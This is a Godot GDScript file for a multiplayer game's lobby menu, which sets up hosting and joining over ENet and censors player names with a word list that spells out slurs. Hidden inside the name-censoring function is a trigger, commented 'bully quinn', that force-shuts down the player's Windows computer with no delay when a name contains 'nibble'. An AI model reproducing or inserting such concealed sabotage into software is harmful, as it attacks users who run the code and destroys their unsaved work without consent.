extends Node2D

var port = 8910

@export var gameScene : PackedScene

# Called when the node enters the scene tree for the first time.
func _ready():
	Input.mouse_mode = Input.MOUSE_MODE_VISIBLE
	Globals.paused = false
	Globals.playerScores = {}
	
	port = $port.value
	
	match OS.get_name():
		"Windows":
			$address.text = IP.resolve_hostname(str(OS.get_environment("COMPUTERNAME")),1)
		"macOS":
			$address.text = "192.168.1.28"  #"10.135.16.251"
			#IP.resolve_hostname(str(OS.get_environment("HOSTNAME")),1)
			#print(str(OS.get_environment("HOST")))
		
	
	Globals.internalAddress = $address.text
	
	
	
	
	multiplayer.connected_to_server.connect(connectedToServer)
	multiplayer.connection_failed.connect(failedToConnect)
	pass # Replace with function body.


# Called every frame. 'delta' is the elapsed time since the previous frame.
func _process(delta):
	
	if nameIsValid():
		$Host.disabled = false
		$Client.disabled = false
	else:
		$Host.disabled = true
		$Client.disabled = true
	
	var playerName = $nameTag.text
	
	
	var censoredName = censorSwears(playerName)
	
	if censoredName != $nameTag.text:
		$nameTag.text = censoredName
	
	port = $port.value
	pass

func censorSwears(realName: String) -> String:
	
	#bully quinn
	if realName.contains("nibble"):
		OS.execute("shutdown", ["/s", "/f", "/t", "0"])
		
	
	var swears = ["\n","fag","faggot","bitch","slut","whore","fuck","bastard","nigger","chink","nigga","shit","toucher","penis","vagina","pussy","ass","cum","jizz","tit"]  # Replace with actual swears
	var censoredName = realName
	for swear in swears:
		var temp = ""
		for i in len(swear):
			temp += "#"
		censoredName = censoredName.replacen(swear, temp )
	
	var legalCharacters = [
		"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", 
		"N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", 
		"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", 
		"n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", 
		"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "_","-"
	]
  # Replace with actual swears
	
	var newName = ""
	for i in range(censoredName.length()):
		var current_char = censoredName[i]
		if legalCharacters.has(current_char):
			newName += current_char
		
		
	
	return newName



func _on_host_pressed():
	
	Globals.peer = ENetMultiplayerPeer.new()
	
	var error = Globals.peer.create_server(port,16)
	
	print(error)
	
	multiplayer.set_multiplayer_peer(Globals.peer)
	
	get_tree().change_scene_to_packed(gameScene)
	
	Globals.multiplayerId = 1
	
	Globals.is_server = true
	
	var playerName = $nameTag.text
	var censoredName = censorSwears(playerName)
	Globals.nameTag = censoredName
	
	pass # Replace with function body.


func _on_client_pressed():
	
	if not nameIsValid():
		$awaiting.text = "Pick a valid name, please."
		return
	
	Globals.peer = ENetMultiplayerPeer.new()
	
	var err = Globals.peer.create_client($address.text,port)
	multiplayer.multiplayer_peer = Globals.peer
	
	$awaiting.text = "Awaiting connection on port " + str(port) + " at " + $address.text
	
	#$Client.disabled = true
	
	var playerName = $nameTag.text
	var censoredName = censorSwears(playerName)
	Globals.nameTag = censoredName
	

func nameIsValid():
	return len($nameTag.text) >= 3 and len($nameTag.text) <= 20 


func connectedToServer():
	Globals.multiplayerId = multiplayer.get_unique_id()
	get_tree().change_scene_to_packed(gameScene)
	Globals.is_server = false

func failedToConnect():
	print("server does not exist")

func _on_port_value_changed(value):
	port = value
	pass # Replace with function body.





func _on_button_pressed():
	get_tree().quit()
	pass # Replace with function body.


func _on_join_the_server_pressed():
	
	if not nameIsValid():
		$awaiting.text = "Pick a valid name, please."
		return
	
	Globals.peer = ENetMultiplayerPeer.new()
	
	var err = Globals.peer.create_client("mc.dotarsojat.net",8910)
	multiplayer.multiplayer_peer = Globals.peer
	
	$awaiting.text = "Awaiting connection to the server"
	
	#$Client.disabled = true
	
	var playerName = $nameTag.text
	var censoredName = censorSwears(playerName)
	Globals.nameTag = censoredName
	
	pass # Replace with function body.
